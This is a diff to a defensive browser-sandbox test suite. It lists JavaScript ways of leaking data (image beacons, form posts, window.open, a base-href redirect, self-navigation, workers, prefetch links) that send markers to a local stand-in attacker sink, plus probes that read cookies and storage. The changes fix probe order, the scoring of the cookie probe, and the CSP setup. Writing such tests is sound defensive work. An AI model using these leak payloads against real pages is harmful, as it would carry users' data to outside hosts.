@@ -178,7 +178,13 @@ _CHANNELS: list[tuple[str, str]] = [
     ("image beacon", "(() => { const i = new Image(); i.src = SINK + '/img-MARKER' })()"),
     ("form post", "(() => { const f = document.createElement('form'); f.method = 'POST'; f.action = SINK + '/form-MARKER'; document.body.appendChild(f); try { f.submit() } catch (e) {} })()"),
     ("window.open", "try { window.open(SINK + '/open-MARKER') } catch (e) {}"),
-    ("base href", "(() => { const b = document.createElement('base'); b.href = SINK + '/base-MARKER/'; document.head.appendChild(b); const i = new Image(); i.src = 'relative-MARKER' })()"),
+    # Cleans up after itself: a <base> left in the document re-points every
+    # relative URL built afterwards, so the next channel to use one would report
+    # a leak that is really this channel's residue. Measured — the element
+    # survives and `new URL('x', document.baseURI)` resolves to the sink. No
+    # current payload is relative, so nothing is wrong today; the removal is
+    # what keeps that true when one is added.
+    ("base href", "(() => { const b = document.createElement('base'); b.href = SINK + '/base-MARKER/'; document.head.appendChild(b); const i = new Image(); i.src = 'relative-MARKER'; setTimeout(() => b.remove(), 300) })()"),
     ("self-navigation", "try { location.href = SINK + '/nav-MARKER' } catch (e) {}"),
     ("worker", "try { new Worker(URL.createObjectURL(new Blob([\"fetch('\" + SINK + \"/worker-MARKER')\"], {type: 'text/javascript'}))) } catch (e) {}"),
     ("prefetch", "(() => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = SINK + '/prefetch-MARKER'; document.head.appendChild(l) })()"),
@@ -230,6 +236,23 @@ def _attempt(context, payload: str) -> None:
 _RENDER_FRAME_MARKERS = ("/render", "about:srcdoc", "blob:")
 
 
+def _ordered_channels() -> list[tuple[str, str]]:
+    """Channels with self-navigation last, because it contaminates the rest.
+
+    A successful self-navigation moves the frame to the ATTACKER's origin, where
+    no policy applies. Every channel probed after it then runs in that document
+    and reaches the sink trivially — measured: run in declaration order, worker
+    and prefetch both "leaked"; run with self-navigation last, both are blocked
+    and the console shows CSP refusing them by name.
+
+    That is a false POSITIVE, which is the rarer and more confusing direction:
+    the suite reports a breach that is really its own probe order.
+    """
+    return [c for c in _CHANNELS if c[0] != "self-navigation"] + [
+        c for c in _CHANNELS if c[0] == "self-navigation"
+    ]
+
+
 def _render_frame(page):
     """The sandboxed render frame, or None when the page has no such child.
 
@@ -273,7 +296,9 @@ def test_n0_the_sink_records_a_hit_when_nothing_blocks_it():
         sink.stop()
 
 
-@pytest.mark.parametrize("channel,js", _CHANNELS, ids=[c for c, _ in _CHANNELS])
+@pytest.mark.parametrize(
+    "channel,js", _ordered_channels(), ids=[c for c, _ in _ordered_channels()]
+)
 def test_n1_the_render_frame_reaches_no_attacker_origin(channel: str, js: str):
     """No channel carries a byte out of the render frame.
 
@@ -313,11 +338,15 @@ def test_n1_the_render_frame_reaches_no_attacker_origin(channel: str, js: str):
 
         assert not sink.saw(marker), (
             f"the {channel} channel carried a request out of the render frame to "
-            f"an attacker origin: {sink.hits!r}. The frame's egress block is not "
-            "closed for this channel — check the renderer document's CSP "
-            "(remembering that base-uri and form-action do NOT inherit from "
-            "default-src, and that a same-frame navigation is not a fetch at "
-            "all, so no fetch directive touches it)."
+            f"an attacker origin: {sink.hits!r}. Which control failed depends on "
+            "the channel, so check the right one: `form post` and `window.open` "
+            "are stopped by the SANDBOX token list (allow-forms and allow-popups "
+            "are absent) rather than by CSP — measured, they stay blocked with "
+            "form-action removed from the policy. The fetch-class channels are "
+            "stopped by the renderer document's CSP, where base-uri and "
+            "form-action do NOT inherit from default-src. A same-frame "
+            "navigation is neither: no fetch directive touches it, and it is the "
+            "residual ADR-0026 states."
         )
     finally:
         sink.stop()
@@ -342,7 +371,7 @@ def test_n2_the_same_channels_reach_the_sink_from_an_unpoliced_page():
             browser = p.chromium.launch()
             try:
                 page = browser.new_page()
-                for channel, js in _CHANNELS:
+                for channel, js in _ordered_channels():
                     marker = "ctl-" + channel.replace(" ", "-").replace(".", "")
                     # Served BY the sink: a real http origin on the same
                     # address space, so Private Network Access does not refuse
@@ -375,7 +404,12 @@ def test_n2_the_same_channels_reach_the_sink_from_an_unpoliced_page():
 # thing: either the access throws (SecurityError / TypeError) or it yields an
 # empty result. Anything else is a read the ADR says is impossible.
 _READS: list[tuple[str, str]] = [
-    ("document.cookie", "document.cookie"),
+    # Wrapped like every other entry, and it must be: in an opaque origin
+    # `document.cookie` RAISES SecurityError, it does not return "". Bare, the
+    # probe errored on a correct frame and PASSED on one carrying
+    # allow-same-origin — where cookie access succeeds and returns "" — which
+    # is the exact regression this file exists to catch, scored backwards.
+    ("document.cookie", "(() => { try { return 'READ:' + document.cookie } catch (e) { return 'THREW:' + e.name } })()"),
     ("localStorage", "(() => { try { localStorage.setItem('x','1'); return 'READABLE:' + localStorage.getItem('x') } catch (e) { return 'THREW:' + e.name } })()"),
     ("sessionStorage", "(() => { try { sessionStorage.setItem('x','1'); return 'READABLE:' + sessionStorage.getItem('x') } catch (e) { return 'THREW:' + e.name } })()"),
     ("indexedDB", "(() => { try { const r = indexedDB.open('probe'); return r ? 'OPENED' : 'NO-HANDLE' } catch (e) { return 'THREW:' + e.name } })()"),
@@ -445,6 +479,14 @@ def test_n3_the_render_frame_reads_nothing_it_does_not_own(surface: str, js: str
 _HOST_PAGE = """<!doctype html><meta charset=utf-8><title>host</title>
 <iframe {sandbox} srcdoc="{body}"></iframe>"""
 
+# The artifact body's own policy, which is what stops a hostile body's script in
+# production. Delivered inside the body here because srcdoc carries no headers;
+# the shipped path sends it as a header on the content route.
+_BODY_CSP_META = (
+    "&lt;meta http-equiv=&quot;Content-Security-Policy&quot; "
+    "content=&quot;default-src 'none'; script-src 'none'&quot;&gt;"
+)
+
 
 def _script_body(sink_url: str, marker: str) -> str:
     """A render body whose inline script tries to phone home, HTML-escaped for srcdoc."""
@@ -455,8 +497,13 @@ def _script_body(sink_url: str, marker: str) -> str:
 @pytest.mark.parametrize(
     "label,sandbox_attr,expect_leak",
     [
-        ("sandboxed, no allow-scripts", 'sandbox=""', False),
-        ("unsandboxed (control)", "", True),
+        # What production ships: the frame KEEPS allow-scripts (the renderer
+        # needs it) and the artifact BODY carries script-src 'none'. Testing
+        # sandbox="" instead would prove a stricter primitive the product does
+        # not rely on, and would stay green if the shipped body lost its CSP —
+        # which is the misconfiguration that lets a hostile body's script run.
+        ("allow-scripts + body script-src 'none'", 'sandbox="allow-scripts"', False),
+        ("allow-scripts, no body CSP (control)", 'sandbox="allow-scripts"', True),
     ],
     ids=["blocked", "control"],
 )
@@ -480,11 +527,11 @@ def test_n4_an_inline_script_in_the_body_never_runs(label, sandbox_attr, expect_
             try:
                 page = browser.new_page()
                 page.goto(f"{sink.url}/__control__")
+                body = _script_body(sink.url, marker)
+                if not expect_leak:
+                    body = _BODY_CSP_META + body
                 page.set_content(
-                    _HOST_PAGE.format(
-                        sandbox=sandbox_attr,
-                        body=_script_body(sink.url, marker),
-                    )
+                    _HOST_PAGE.format(sandbox=sandbox_attr, body=body)
                 )
                 _await_hit(page, sink, marker)
             finally:
